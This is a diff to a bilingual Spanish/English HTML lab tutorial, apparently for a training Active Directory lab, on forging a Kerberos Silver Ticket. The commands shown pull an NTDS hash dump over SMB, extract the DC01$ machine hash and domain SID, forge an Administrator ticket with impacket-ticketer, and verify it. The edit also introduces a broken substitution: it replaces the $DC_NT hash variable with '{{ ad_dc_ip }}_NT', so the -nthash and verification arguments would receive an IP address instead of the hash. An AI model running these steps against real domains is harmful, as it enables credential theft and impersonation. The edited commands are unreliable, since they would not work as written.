@@ -34,17 +34,15 @@ python3 verify_ticket.py Administrator.ccache '&lt;hash_NT_DC01$&gt;' Administra
     <p>En Kerberos, el TGS (ticket de servicio) va cifrado con la clave de la cuenta que da el servicio. Si conoces esa clave — el hash de la cuenta de máquina <code>DC01$</code> para el servicio <code>cifs</code> — puedes <strong>forjar</strong> tú mismo un TGS válido para cualquier usuario. Es un <em>Silver Ticket</em>: acceso a <em>un</em> servicio concreto, sin pasar por el KDC (a diferencia del Golden Ticket, que usa el hash de krbtgt y abre todo el dominio).</p>
 
     <h3>2 · Reunir los ingredientes (del lab AD 10)</h3>
-    <pre>export DC={{ ad_dc_ip }}
-
-nxc smb $DC -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
+    <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
 export DC_NT=$(grep '{{ ad_dc_host }}\$' ntds_dump.txt | cut -d: -f4)
 export DOMSID=$(grep 'SID del dominio' ntds_dump.txt | awk '{print $NF}')
-echo "DC01\$ hash: $DC_NT"
+echo "DC01\$ hash: {{ ad_dc_ip }}_NT"
 echo "Domain SID: $DOMSID"</pre>
 
     <h3>3 · Forjar el Silver Ticket</h3>
     <pre>impacket-ticketer \
-  -nthash "$DC_NT" \
+  -nthash "{{ ad_dc_ip }}_NT" \
   -domain-sid "$DOMSID" \
   -domain {{ ad_realm_lower }} \
   -spn 'cifs/{{ ad_dc_fqdn }}' \
@@ -61,9 +59,9 @@ klist</pre>
 
     <h3>5 · Verificar el forjado localmente</h3>
     <p>Descarga el script de verificación (descifra el ticket con la misma clave que usaste para forjarlo y confirma la identidad reclamada):</p>
-    <pre>smbclient -N //$DC/public -c 'get verify_ticket.py'
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get verify_ticket.py'
 
-python3 verify_ticket.py Administrator.ccache "$DC_NT" Administrator</pre>
+python3 verify_ticket.py Administrator.ccache "{{ ad_dc_ip }}_NT" Administrator</pre>
     <pre>Ticket descifrado correctamente con la clave proporcionada.
 Identidad reclamada (cname): Administrator
 Realm: HACKLABS.LOCAL
@@ -89,17 +87,15 @@ OK: la clave descifra el ticket y confirma la identidad forjada.</pre>
     <p>In Kerberos, the TGS (service ticket) is encrypted with the key of the account providing the service. If you know that key — the <code>DC01$</code> machine account hash for the <code>cifs</code> service — you can <strong>forge</strong> a valid TGS for any user yourself. That is a <em>Silver Ticket</em>: access to <em>one</em> specific service, bypassing the KDC (unlike the Golden Ticket, which uses the krbtgt hash and opens the whole domain).</p>
 
     <h3>2 · Gather the ingredients (from lab AD 10)</h3>
-    <pre>export DC={{ ad_dc_ip }}
-
-nxc smb $DC -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
+    <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
 export DC_NT=$(grep '{{ ad_dc_host }}\$' ntds_dump.txt | cut -d: -f4)
 export DOMSID=$(grep 'SID del dominio' ntds_dump.txt | awk '{print $NF}')
-echo "DC01\$ hash: $DC_NT"
+echo "DC01\$ hash: {{ ad_dc_ip }}_NT"
 echo "Domain SID: $DOMSID"</pre>
 
     <h3>3 · Forge the Silver Ticket</h3>
     <pre>impacket-ticketer \
-  -nthash "$DC_NT" \
+  -nthash "{{ ad_dc_ip }}_NT" \
   -domain-sid "$DOMSID" \
   -domain {{ ad_realm_lower }} \
   -spn 'cifs/{{ ad_dc_fqdn }}' \
@@ -116,9 +112,9 @@ klist</pre>
 
     <h3>5 · Verify the forge locally</h3>
     <p>Download the verification script (decrypts the ticket with the same key you used to forge it and confirms the claimed identity):</p>
-    <pre>smbclient -N //$DC/public -c 'get verify_ticket.py'
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get verify_ticket.py'
 
-python3 verify_ticket.py Administrator.ccache "$DC_NT" Administrator</pre>
+python3 verify_ticket.py Administrator.ccache "{{ ad_dc_ip }}_NT" Administrator</pre>
     <pre>Ticket descifrado correctamente con la clave proporcionada.
 Identidad reclamada (cname): Administrator
 Realm: HACKLABS.LOCAL
